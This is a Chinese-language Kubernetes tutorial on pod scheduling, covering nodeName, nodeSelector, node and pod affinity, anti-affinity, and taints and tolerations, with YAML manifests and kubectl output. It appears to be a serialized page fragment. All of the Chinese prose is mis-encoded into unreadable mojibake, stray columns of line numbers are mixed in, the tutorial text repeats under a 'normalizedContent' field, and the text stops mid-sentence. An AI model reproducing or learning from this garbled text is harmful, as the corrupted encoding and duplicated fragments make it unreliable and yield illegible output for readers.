ä¸ºnode1è®¾ç½®æ±¡ç¹(åæ¶PreferNoScheduleï¼è®¾ç½®NoSchedule)\n[root@k8s-master01 ~]# kubectl taint nodes node1 tag:PreferNoSchedule-\n[root@k8s-master01 ~]# kubectl taint nodes node1 tag=heima:NoSchedule\n\n# åå»ºpod2\n[root@k8s-master01 ~]# kubectl run taint2 --image=nginx:1.17.1 -n dev\n[root@k8s-master01 ~]# kubectl get pods taint2 -n dev -o wide\nNAME                      READY   STATUS    RESTARTS   AGE     IP            NODE\ntaint1-7665f7fd85-574h4   1/1     Running   0          2m24s   10.244.1.59   node1 \ntaint2-544694789-6zmlf    0/1     Pending   0          21s     <none>        <none>   \n\n# ä¸ºnode1è®¾ç½®æ±¡ç¹(åæ¶NoScheduleï¼è®¾ç½®NoExecute)\n[root@k8s-master01 ~]# kubectl taint nodes node1 tag:NoSchedule-\n[root@k8s-master01 ~]# kubectl taint nodes node1 tag=heima:NoExecute\n\n# åå»ºpod3\n[root@k8s-master01 ~]# kubectl run taint3 --image=nginx:1.17.1 -n dev\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide\nNAME                      READY   STATUS    RESTARTS   AGE   IP       NODE     NOMINATED \ntaint1-7665f7fd85-htkmp   0/1     Pending   0          35s   <none>   <none>   <none>    \ntaint2-544694789-bn7wb    0/1     Pending   0          35s   <none>   <none>   <none>     \ntaint3-6d78dbd749-tktkq   0/1     Pending   0          6s    <none>   <none>   <none>     \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n> ä½¿ç¨ kubeadm æ­å»ºçéç¾¤ï¼é»è®¤å°±ä¼ç» master èç¹æ·»å ä¸ä¸ªæ±¡ç¹æ è®°ï¼æä»¥ pod å°±ä¸ä¼è°åº¦å° master èç¹ä¸.\n\nå®¹å¿ï¼Tolerationï¼\n\nä¸é¢ä»ç»äºæ±¡ç¹çä½ç¨ï¼æä»¬å¯ä»¥å¨ node ä¸æ·»å æ±¡ç¹ç¨äºæç» pod è°åº¦ä¸æ¥ï¼ä½æ¯å¦æå°±æ¯æ³å°ä¸ä¸ª pod è°åº¦å°ä¸ä¸ªææ±¡ç¹ç node ä¸å»ï¼è¿æ¶ååºè¯¥æä¹åå¢ï¼è¿å°±è¦ä½¿ç¨å°å®¹å¿ã\n\n\n\n> æ±¡ç¹å°±æ¯æç»ï¼å®¹å¿å°±æ¯å¿½ç¥ï¼Node éè¿æ±¡ç¹æç» pod è°åº¦ä¸å»ï¼Pod éè¿å®¹å¿å¿½ç¥æç»\n\nä¸é¢åéè¿ä¸ä¸ªæ¡ä¾çä¸ææï¼\n\n 1. ä¸ä¸å°èï¼å·²ç»å¨ node1 èç¹ä¸æä¸äº NoExecute çæ±¡ç¹ï¼æ­¤æ¶ pod æ¯è°åº¦ä¸ä¸å»ç\n 2. æ¬å°èï¼å¯ä»¥éè¿ç» pod æ·»å å®¹å¿ï¼ç¶åå°å¶è°åº¦ä¸å»\n\nåå»º pod-toleration.yaml, åå®¹å¦ä¸\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-toleration\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  tolerations:      # æ·»å å®¹å¿\n  - key: "tag"        # è¦å®¹å¿çæ±¡ç¹çkey\n    operator: "Equal" # æä½ç¬¦\n    value: "heima"    # å®¹å¿çæ±¡ç¹çvalue\n    effect: "NoExecute"   # æ·»å å®¹å¿çè§åï¼è¿éå¿é¡»åæ è®°çæ±¡ç¹è§åç¸å\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n# æ·»å å®¹å¿ä¹åçpod\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide\nNAME             READY   STATUS    RESTARTS   AGE   IP       NODE     NOMINATED \npod-toleration   0/1     Pending   0          3s    <none>   <none>   <none>           \n\n# æ·»å å®¹å¿ä¹åçpod\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide\nNAME             READY   STATUS    RESTARTS   AGE   IP            NODE    NOMINATED\npod-toleration   1/1     Running   0          3s    10.244.1.62   node1   <none>        \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nä¸é¢çä¸ä¸å®¹å¿çè¯¦ç»éç½®:\n\n[root@k8s-master01 ~]# kubectl explain pod.spec.tolerations\n......\nFIELDS:\n   key       \n   value     \n   operator  \n   effect    \n   tolerationSeconds  \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n * key å¯¹åºçè¦å®¹å¿çæ±¡ç¹çé®ï¼ç©ºæå³çå¹éææçé®\n * value å¯¹åºçè¦å®¹å¿çæ±¡ç¹çå¼\n * operator key-value çè¿ç®ç¬¦ï¼æ¯æ Equal å Existsï¼é»è®¤ï¼\n * effect å¯¹åºæ±¡ç¹ç effectï¼ç©ºæå³çå¹éææå½±å\n * tolerationSeconds å®¹å¿æ¶é´ï¼å½ effect ä¸º NoExecute æ¶çæï¼è¡¨ç¤º pod å¨ Node ä¸çåçæ¶é´',normalizedContent:'å¨é»è®¤æåµä¸ï¼ä¸ä¸ª pod å¨åªä¸ª node èç¹ä¸è¿è¡ï¼æ¯ç± scheduler ç»ä»¶éç¨ç¸åºçç®æ³è®¡ç®åºæ¥çï¼è¿ä¸ªè¿ç¨æ¯ä¸åäººå·¥æ§å¶çãä½æ¯å¨å®éä½¿ç¨ä¸­ï¼è¿å¹¶ä¸æ»¡è¶³çéæ±ï¼å ä¸ºå¾å¤æåµä¸ï¼æä»¬æ³æ§å¶æäº pod å°è¾¾æäºèç¹ä¸ï¼é£ä¹åºè¯¥æä¹åå¢ï¼è¿å°±è¦æ±äºè§£ kubernetes å¯¹ pod çè°åº¦è§åï¼kubernetes æä¾äºåå¤§ç±»è°åº¦æ¹å¼ï¼\n\n * èªå¨è°åº¦ï¼è¿è¡å¨åªä¸ªèç¹ä¸å®å¨ç± scheduler ç»è¿ä¸ç³»åçç®æ³è®¡ç®å¾åº\n * å®åè°åº¦ï¼nodenameãnodeselector\n * äº²åæ§è°åº¦ï¼nodeaffinityãpodaffinityãpodantiaffinity\n * æ±¡ç¹ï¼å®¹å¿ï¼è°åº¦ï¼taintsãtoleration\n\n\n# å®åè°åº¦\n\nå®åè°åº¦ï¼æçæ¯å©ç¨å¨ pod ä¸å£°æ nodename æè nodeselectorï¼ä»¥æ­¤å° pod è°åº¦å°ææç node èç¹ä¸ãæ³¨æï¼è¿éçè°åº¦æ¯å¼ºå¶çï¼è¿å°±æå³çå³ä½¿è¦è°åº¦çç®æ  node ä¸å­å¨ï¼ä¹ä¼åä¸é¢è¿è¡è°åº¦ï¼åªä¸è¿ pod è¿è¡å¤±è´¥èå·²ã\n\nnodename\n\nnodename ç¨äºå¼ºå¶çº¦æå° pod è°åº¦å°æå®ç name ç node èç¹ä¸ãè¿ç§æ¹å¼ï¼å¶å®æ¯ç´æ¥è·³è¿ scheduler çè°åº¦é»è¾ï¼ç´æ¥å° pod è°åº¦å°æå®åç§°çèç¹ã\n\næ¥ä¸æ¥ï¼å®éªä¸ä¸ï¼åå»ºä¸ä¸ª pod-nodename.yaml æä»¶\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-nodename\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  nodename: node1 # æå®è°åº¦å°node1èç¹ä¸\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n#åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f pod-nodename.yaml\npod/pod-nodename created\n\n#æ¥çpodè°åº¦å°nodeå±æ§ï¼ç¡®å®æ¯è°åº¦å°äºnode1èç¹ä¸\n[root@k8s-master01 ~]# kubectl get pods pod-nodename -n dev -o wide\nname           ready   status    restarts   age   ip            node      ......\npod-nodename   1/1     running   0          56s   10.244.1.87   node1     ......   \n\n# æ¥ä¸æ¥ï¼å é¤podï¼ä¿®æ¹nodenameçå¼ä¸ºnode3ï¼å¹¶æ²¡ænode3èç¹ï¼\n[root@k8s-master01 ~]# kubectl delete -f pod-nodename.yaml\npod "pod-nodename" deleted\n[root@k8s-master01 ~]# vim pod-nodename.yaml\n[root@k8s-master01 ~]# kubectl create -f pod-nodename.yaml\npod/pod-nodename created\n\n#åæ¬¡æ¥çï¼åç°å·²ç»ånode3èç¹è°åº¦ï¼ä½æ¯ç±äºä¸å­å¨node3èç¹ï¼æä»¥podæ æ³æ­£å¸¸è¿è¡\n[root@k8s-master01 ~]# kubectl get pods pod-nodename -n dev -o wide\nname           ready   status    restarts   age   ip       node    ......\npod-nodename   0/1     pending   0          6s    <none>   node3   ......        \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\nnodeselector\n\nnodeselector ç¨äºå° pod è°åº¦å°æ·»å äºæå®æ ç­¾ç node èç¹ä¸ãå®æ¯éè¿ kubernetes ç label-selector æºå¶å®ç°çï¼ä¹å°±æ¯è¯´ï¼å¨ pod åå»ºä¹åï¼ä¼ç± scheduler ä½¿ç¨ matchnodeselector è°åº¦ç­ç¥è¿è¡ label å¹éï¼æ¾åºç®æ  nodeï¼ç¶åå° pod è°åº¦å°ç®æ èç¹ï¼è¯¥å¹éè§åæ¯å¼ºå¶çº¦æã\n\næ¥ä¸æ¥ï¼å®éªä¸ä¸ï¼\n\n1 é¦ååå«ä¸º node èç¹æ·»å æ ç­¾\n\n[root@k8s-master01 ~]# kubectl label nodes node1 nodeenv=pro\nnode/node2 labeled\n[root@k8s-master01 ~]# kubectl label nodes node2 nodeenv=test\nnode/node2 labeled\n\n\n1\n2\n3\n4\n\n\n2 åå»ºä¸ä¸ª pod-nodeselector.yaml æä»¶ï¼å¹¶ä½¿ç¨å®åå»º pod\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-nodeselector\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  nodeselector: \n    nodeenv: pro # æå®è°åº¦å°å·ænodeenv=proæ ç­¾çèç¹ä¸\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n#åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f pod-nodeselector.yaml\npod/pod-nodeselector created\n\n#æ¥çpodè°åº¦å°nodeå±æ§ï¼ç¡®å®æ¯è°åº¦å°äºnode1èç¹ä¸\n[root@k8s-master01 ~]# kubectl get pods pod-nodeselector -n dev -o wide\nname               ready   status    restarts   age     ip          node    ......\npod-nodeselector   1/1     running   0          47s   10.244.1.87   node1   ......\n\n# æ¥ä¸æ¥ï¼å é¤podï¼ä¿®æ¹nodeselectorçå¼ä¸ºnodeenv: xxxxï¼ä¸å­å¨æææ­¤æ ç­¾çèç¹ï¼\n[root@k8s-master01 ~]# kubectl delete -f pod-nodeselector.yaml\npod "pod-nodeselector" deleted\n[root@k8s-master01 ~]# vim pod-nodeselector.yaml\n[root@k8s-master01 ~]# kubectl create -f pod-nodeselector.yaml\npod/pod-nodeselector created\n\n#åæ¬¡æ¥çï¼åç°podæ æ³æ­£å¸¸è¿è¡,nodeçå¼ä¸ºnone\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide\nname               ready   status    restarts   age     ip       node    \npod-nodeselector   0/1     pending   0          2m20s   <none>   <none>\n\n# æ¥çè¯¦æ,åç°node selectorå¹éå¤±è´¥çæç¤º\n[root@k8s-master01 ~]# kubectl describe pods pod-nodeselector -n dev\n.......\nevents:\n  type     reason            age        from               message\n  ----     ------            ----       ----               -------\n  warning  failedscheduling  <unknown>  default-scheduler  0/3 nodes are available: 3 node(s) didn\'t match node selector.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n\n# äº²åæ§è°åº¦\n\nä»ç»äºä¸¤ç§å®åè°åº¦çæ¹å¼ï¼ä½¿ç¨èµ·æ¥éå¸¸æ¹ä¾¿ï¼ä½æ¯ä¹æä¸å®çé®é¢ï¼é£å°±æ¯å¦ææ²¡ææ»¡è¶³æ¡ä»¶ç nodeï¼é£ä¹ pod å°ä¸ä¼è¢«è¿è¡ï¼å³ä½¿å¨éç¾¤ä¸­è¿æå¯ç¨ node åè¡¨ä¹ä¸è¡ï¼è¿å°±éå¶äºå®çä½¿ç¨åºæ¯ã\n\nåºäºä¸é¢çé®é¢ï¼kubernetes è¿æä¾äºä¸ç§äº²åæ§è°åº¦ï¼affinityï¼ãå®å¨ nodeselector çåºç¡ä¹ä¸çè¿è¡äºæ©å±ï¼å¯ä»¥éè¿éç½®çå½¢å¼ï¼å®ç°ä¼åéæ©æ»¡è¶³æ¡ä»¶ç node è¿è¡è°åº¦ï¼å¦ææ²¡æï¼ä¹å¯ä»¥è°åº¦å°ä¸æ»¡è¶³æ¡ä»¶çèç¹ä¸ï¼ä½¿è°åº¦æ´å çµæ´»ã\n\naffinity ä¸»è¦åä¸ºä¸ç±»ï¼\n\n * nodeaffinity (node äº²åæ§ï¼: ä»¥ node ä¸ºç®æ ï¼è§£å³ pod å¯ä»¥è°åº¦å°åªäº node çé®é¢\n * podaffinity (pod äº²åæ§) : ä»¥ pod ä¸ºç®æ ï¼è§£å³ pod å¯ä»¥ååªäºå·²å­å¨ç pod é¨ç½²å¨åä¸ä¸ªææåä¸­çé®é¢\n * podantiaffinity (pod åäº²åæ§) : ä»¥ pod ä¸ºç®æ ï¼è§£å³ pod ä¸è½ååªäºå·²å­å¨ pod é¨ç½²å¨åä¸ä¸ªææåä¸­çé®é¢\n\n> å³äºäº²åæ§ (åäº²åæ§) ä½¿ç¨åºæ¯çè¯´æï¼\n> äº²åæ§ï¼å¦æä¸¤ä¸ªåºç¨é¢ç¹äº¤äºï¼é£å°±æå¿è¦å©ç¨äº²åæ§è®©ä¸¤ä¸ªåºç¨çå°½å¯è½çé è¿ï¼è¿æ ·å¯ä»¥åå°å ç½ç»éä¿¡èå¸¦æ¥çæ§è½æèã\n> åäº²åæ§ï¼å½åºç¨çéç¨å¤å¯æ¬é¨ç½²æ¶ï¼æå¿è¦éç¨åäº²åæ§è®©åä¸ªåºç¨å®ä¾ææ£åå¸å¨åä¸ª node ä¸ï¼è¿æ ·å¯ä»¥æé«æå¡çé«å¯ç¨æ§ã\n\nnodeaffinity\n\né¦åæ¥çä¸ä¸ nodeaffinity çå¯éç½®é¡¹ï¼\n\npod.spec.affinity.nodeaffinity\n  requiredduringschedulingignoredduringexecution  nodeèç¹å¿é¡»æ»¡è¶³æå®çææè§åæå¯ä»¥ï¼ç¸å½äºç¡¬éå¶\n    nodeselectorterms  èç¹éæ©åè¡¨\n      matchfields   æèç¹å­æ®µååºçèç¹éæ©å¨è¦æ±åè¡¨\n      matchexpressions   æèç¹æ ç­¾ååºçèç¹éæ©å¨è¦æ±åè¡¨(æ¨è)\n        key    é®\n        values å¼\n        operator å³ç³»ç¬¦ æ¯æexists, doesnotexist, in, notin, gt, lt\n  preferredduringschedulingignoredduringexecution ä¼åè°åº¦å°æ»¡è¶³æå®çè§åçnodeï¼ç¸å½äºè½¯éå¶ (å¾å)\n    preference   ä¸ä¸ªèç¹éæ©å¨é¡¹ï¼ä¸ç¸åºçæéç¸å³è\n      matchfields   æèç¹å­æ®µååºçèç¹éæ©å¨è¦æ±åè¡¨\n      matchexpressions   æèç¹æ ç­¾ååºçèç¹éæ©å¨è¦æ±åè¡¨(æ¨è)\n        key    é®\n        values å¼\n        operator å³ç³»ç¬¦ æ¯æin, notin, exists, doesnotexist, gt, lt\n\tweight å¾åæéï¼å¨èå´1-100ã\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nå³ç³»ç¬¦çä½¿ç¨è¯´æ:\n\n- matchexpressions:\n  - key: nodeenv              # å¹éå­å¨æ ç­¾çkeyä¸ºnodeenvçèç¹\n    operator: exists\n  - key: nodeenv              # å¹éæ ç­¾çkeyä¸ºnodeenv,ä¸valueæ¯"xxx"æ"yyy"çèç¹\n    operator: in\n    values: ["xxx","yyy"]\n  - key: nodeenv              # å¹éæ ç­¾çkeyä¸ºnodeenv,ä¸valueå¤§äº"xxx"çèç¹\n    operator: gt\n    values: "xxx"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\næ¥ä¸æ¥é¦åæ¼ç¤ºä¸ä¸ requiredduringschedulingignoredduringexecution , åå»º pod-nodeaffinity-required.yaml\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-nodeaffinity-required\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  affinity:  #äº²åæ§è®¾ç½®\n    nodeaffinity: #è®¾ç½®nodeäº²åæ§\n      requiredduringschedulingignoredduringexecution: # ç¡¬éå¶\n        nodeselectorterms:\n        - matchexpressions: # å¹éenvçå¼å¨["xxx","yyy"]ä¸­çæ ç­¾\n          - key: nodeenv\n            operator: in\n            values: ["xxx","yyy"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n# åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f pod-nodeaffinity-required.yaml\npod/pod-nodeaffinity-required created\n\n# æ¥çpodç¶æ ï¼è¿è¡å¤±è´¥ï¼\n[root@k8s-master01 ~]# kubectl get pods pod-nodeaffinity-required -n dev -o wide\nname                        ready   status    restarts   age   ip       node    ...... \npod-nodeaffinity-required   0/1     pending   0          16s   <none>   <none>  ......\n\n# æ¥çpodçè¯¦æ\n# åç°è°åº¦å¤±è´¥ï¼æç¤ºnodeéæ©å¤±è´¥\n[root@k8s-master01 ~]# kubectl describe pod pod-nodeaffinity-required -n dev\n......\n  warning  failedscheduling  <unknown>  default-scheduler  0/3 nodes are available: 3 node(s) didn\'t match node selector.\n  warning  failedscheduling  <unknown>  default-scheduler  0/3 nodes are available: 3 node(s) didn\'t match node selector.\n\n#æ¥ä¸æ¥ï¼åæ­¢pod\n[root@k8s-master01 ~]# kubectl delete -f pod-nodeaffinity-required.yaml\npod "pod-nodeaffinity-required" deleted\n\n# ä¿®æ¹æä»¶ï¼å°values: ["xxx","yyy"]------\x3e ["pro","yyy"]\n[root@k8s-master01 ~]# vim pod-nodeaffinity-required.yaml\n\n# åæ¬¡å¯å¨\n[root@k8s-master01 ~]# kubectl create -f pod-nodeaffinity-required.yaml\npod/pod-nodeaffinity-required created\n\n# æ­¤æ¶æ¥çï¼åç°è°åº¦æåï¼å·²ç»å°podè°åº¦å°äºnode1ä¸\n[root@k8s-master01 ~]# kubectl get pods pod-nodeaffinity-required -n dev -o wide\nname                        ready   status    restarts   age   ip            node  ...... \npod-nodeaffinity-required   1/1     running   0          11s   10.244.1.89   node1 ......\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\næ¥ä¸æ¥åæ¼ç¤ºä¸ä¸ requiredduringschedulingignoredduringexecution , åå»º pod-nodeaffinity-preferred.yaml\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-nodeaffinity-preferred\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  affinity:  #äº²åæ§è®¾ç½®\n    nodeaffinity: #è®¾ç½®nodeäº²åæ§\n      preferredduringschedulingignoredduringexecution: # è½¯éå¶\n      - weight: 1\n        preference:\n          matchexpressions: # å¹éenvçå¼å¨["xxx","yyy"]ä¸­çæ ç­¾(å½åç¯å¢æ²¡æ)\n          - key: nodeenv\n            operator: in\n            values: ["xxx","yyy"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f pod-nodeaffinity-preferred.yaml\npod/pod-nodeaffinity-preferred created\n\n# æ¥çpodç¶æ ï¼è¿è¡æåï¼\n[root@k8s-master01 ~]# kubectl get pod pod-nodeaffinity-preferred -n dev\nname                         ready   status    restarts   age\npod-nodeaffinity-preferred   1/1     running   0          40s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n> nodeaffinity è§åè®¾ç½®çæ³¨æäºé¡¹ï¼\n> 1 å¦æåæ¶å®ä¹äº nodeselector å nodeaffinityï¼é£ä¹å¿é¡»ä¸¤ä¸ªæ¡ä»¶é½å¾å°æ»¡è¶³ï¼pod æè½è¿è¡å¨æå®ç node ä¸\n> 2 å¦æ nodeaffinity æå®äºå¤ä¸ª nodeselectortermsï¼é£ä¹åªéè¦å¶ä¸­ä¸ä¸ªè½å¤å¹éæåå³å¯\n> 3 å¦æä¸ä¸ª nodeselectorterms ä¸­æå¤ä¸ª matchexpressions ï¼åä¸ä¸ªèç¹å¿é¡»æ»¡è¶³ææçæè½å¹éæå\n> 4 å¦æä¸ä¸ª pod æå¨ç node å¨ pod è¿è¡æé´å¶æ ç­¾åçäºæ¹åï¼ä¸åç¬¦åè¯¥ pod çèç¹äº²åæ§éæ±ï¼åç³»ç»å°å¿½ç¥æ­¤åå\n\npodaffinity\npodaffinity ä¸»è¦å®ç°ä»¥è¿è¡ç pod ä¸ºåç§ï¼å®ç°è®©æ°åå»ºç pod è·åç§ pod å¨ä¸ä¸ªåºåçåè½ãé¦åæ¥çä¸ä¸ podaffinity çå¯éç½®é¡¹ï¼\n\npod.spec.affinity.podaffinity\n  requiredduringschedulingignoredduringexecution  ç¡¬éå¶\n    namespaces       æå®åç§podçnamespace\n    topologykey      æå®è°åº¦ä½ç¨å\n    labelselector    æ ç­¾éæ©å¨\n      matchexpressions  æèç¹æ ç­¾ååºçèç¹éæ©å¨è¦æ±åè¡¨(æ¨è)\n        key    é®\n        values å¼\n        operator å³ç³»ç¬¦ æ¯æin, notin, exists, doesnotexist.\n      matchlabels    æå¤ä¸ªmatchexpressionsæ å°çåå®¹\n  preferredduringschedulingignoredduringexecution è½¯éå¶\n    podaffinityterm  éé¡¹\n      namespaces      \n      topologykey\n      labelselector\n        matchexpressions  \n          key    é®\n          values å¼\n          operator\n        matchlabels \n    weight å¾åæéï¼å¨èå´1-100\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n> topologykey ç¨äºæå®è°åº¦æ¶ä½ç¨åï¼ä¾å¦:\n> å¦ææå®ä¸º kubernetes.io/hostnameï¼é£å°±æ¯ä»¥ node èç¹ä¸ºåºåèå´\n> å¦ææå®ä¸º beta.kubernetes.io/os, åä»¥ node èç¹çæä½ç³»ç»ç±»åæ¥åºå\n\næ¥ä¸æ¥ï¼æ¼ç¤ºä¸ requiredduringschedulingignoredduringexecution\n1ï¼é¦ååå»ºä¸ä¸ªåç§ podï¼pod-podaffinity-target.yamlï¼\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-podaffinity-target\n  namespace: dev\n  labels:\n    podenv: pro #è®¾ç½®æ ç­¾\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  nodename: node1 # å°ç®æ podåç¡®æå®å°node1ä¸\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n# å¯å¨ç®æ pod\n[root@k8s-master01 ~]# kubectl create -f pod-podaffinity-target.yaml\npod/pod-podaffinity-target created\n\n# æ¥çpodç¶åµ\n[root@k8s-master01 ~]# kubectl get pods  pod-podaffinity-target -n dev\nname                     ready   status    restarts   age\npod-podaffinity-target   1/1     running   0          4s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n2ï¼åå»º pod-podaffinity-required.yamlï¼åå®¹å¦ä¸ï¼\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-podaffinity-required\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  affinity:  #äº²åæ§è®¾ç½®\n    podaffinity: #è®¾ç½®podäº²åæ§\n      requiredduringschedulingignoredduringexecution: # ç¡¬éå¶\n      - labelselector:\n          matchexpressions: # å¹éenvçå¼å¨["xxx","yyy"]ä¸­çæ ç­¾\n          - key: podenv\n            operator: in\n            values: ["xxx","yyy"]\n        topologykey: kubernetes.io/hostname\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\nä¸é¢éç½®è¡¨è¾¾çæææ¯ï¼æ° pod å¿é¡»è¦ä¸æ¥ææ ç­¾ nodeenv=xxx æè nodeenv=yyy ç pod å¨åä¸ node ä¸ï¼æ¾ç¶ç°å¨æ²¡æè¿æ · podï¼æ¥ä¸æ¥ï¼è¿è¡æµè¯ä¸ä¸ã\n\n# å¯å¨pod\n[root@k8s-master01 ~]# kubectl create -f pod-podaffinity-required.yaml\npod/pod-podaffinity-required created\n\n# æ¥çpodç¶æï¼åç°æªè¿è¡\n[root@k8s-master01 ~]# kubectl get pods pod-podaffinity-required -n dev\nname                       ready   status    restarts   age\npod-podaffinity-required   0/1     pending   0          9s\n\n# æ¥çè¯¦ç»ä¿¡æ¯\n[root@k8s-master01 ~]# kubectl describe pods pod-podaffinity-required  -n dev\n......\nevents:\n  type     reason            age        from               message\n  ----     ------            ----       ----               -------\n  warning  failedscheduling  <unknown>  default-scheduler  0/3 nodes are available: 2 node(s) didn\'t match pod affinity rules, 1 node(s) had taints that the pod didn\'t tolerate.\n\n# æ¥ä¸æ¥ä¿®æ¹  values: ["xxx","yyy"]-----\x3evalues:["pro","yyy"]\n# æææ¯ï¼æ°podå¿é¡»è¦ä¸æ¥ææ ç­¾nodeenv=xxxæènodeenv=yyyçpodå¨åä¸nodeä¸\n[root@k8s-master01 ~]# vim pod-podaffinity-required.yaml\n\n# ç¶åéæ°åå»ºpodï¼æ¥çææ\n[root@k8s-master01 ~]# kubectl delete -f  pod-podaffinity-required.yaml\npod "pod-podaffinity-required" deleted\n[root@k8s-master01 ~]# kubectl create -f pod-podaffinity-required.yaml\npod/pod-podaffinity-required created\n\n# åç°æ­¤æ¶podè¿è¡æ­£å¸¸\n[root@k8s-master01 ~]# kubectl get pods pod-podaffinity-required -n dev\nname                       ready   status    restarts   age   labels\npod-podaffinity-required   1/1     running   0          6s    <none>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\nå³äº podaffinity ç preferredduringschedulingignoredduringexecution ï¼è¿éä¸åæ¼ç¤ºã\npodantiaffinity\n\npodantiaffinity ä¸»è¦å®ç°ä»¥è¿è¡ç pod ä¸ºåç§ï¼è®©æ°åå»ºç pod è·åç§ pod ä¸å¨ä¸ä¸ªåºåä¸­çåè½ã\n\nå®çéç½®æ¹å¼åéé¡¹è· podaffinty æ¯ä¸æ ·çï¼è¿éä¸ååè¯¦ç»è§£éï¼ç´æ¥åä¸ä¸ªæµè¯æ¡ä¾ã\n\n1ï¼ç»§ç»­ä½¿ç¨ä¸ä¸ªæ¡ä¾ä¸­ç®æ  pod\n\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide --show-labels\nname                     ready   status    restarts   age     ip            node    labels\npod-podaffinity-required 1/1     running   0          3m29s   10.244.1.38   node1   <none>     \npod-podaffinity-target   1/1     running   0          9m25s   10.244.1.37   node1   podenv=pro\n\n\n1\n2\n3\n4\n\n\n2ï¼åå»º pod-podantiaffinity-required.yamlï¼åå®¹å¦ä¸ï¼\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-podantiaffinity-required\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  affinity:  #äº²åæ§è®¾ç½®\n    podantiaffinity: #è®¾ç½®podäº²åæ§\n      requiredduringschedulingignoredduringexecution: # ç¡¬éå¶\n      - labelselector:\n          matchexpressions: # å¹épodenvçå¼å¨["pro"]ä¸­çæ ç­¾\n          - key: podenv\n            operator: in\n            values: ["pro"]\n        topologykey: kubernetes.io/hostname\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\nä¸é¢éç½®è¡¨è¾¾çæææ¯ï¼æ° pod å¿é¡»è¦ä¸æ¥ææ ç­¾ nodeenv=pro ç pod ä¸å¨åä¸ node ä¸ï¼è¿è¡æµè¯ä¸ä¸ã\n\n# åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f pod-podantiaffinity-required.yaml\npod/pod-podantiaffinity-required created\n\n# æ¥çpod\n# åç°è°åº¦å°äºnode2ä¸\n[root@k8s-master01 ~]# kubectl get pods pod-podantiaffinity-required -n dev -o wide\nname                           ready   status    restarts   age   ip            node   .. \npod-podantiaffinity-required   1/1     running   0          30s   10.244.1.96   node2  ..\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# æ±¡ç¹åå®¹å¿\n\næ±¡ç¹ï¼taintsï¼\n\nåé¢çè°åº¦æ¹å¼é½æ¯ç«å¨ pod çè§åº¦ä¸ï¼éè¿å¨ pod ä¸æ·»å å±æ§ï¼æ¥ç¡®å® pod æ¯å¦è¦è°åº¦å°æå®ç node ä¸ï¼å¶å®æä»¬ä¹å¯ä»¥ç«å¨ node çè§åº¦ä¸ï¼éè¿å¨ node ä¸æ·»å æ±¡ç¹å±æ§ï¼æ¥å³å®æ¯å¦åè®¸ pod è°åº¦è¿æ¥ã\n\nnode è¢«è®¾ç½®ä¸æ±¡ç¹ä¹åå°±å pod 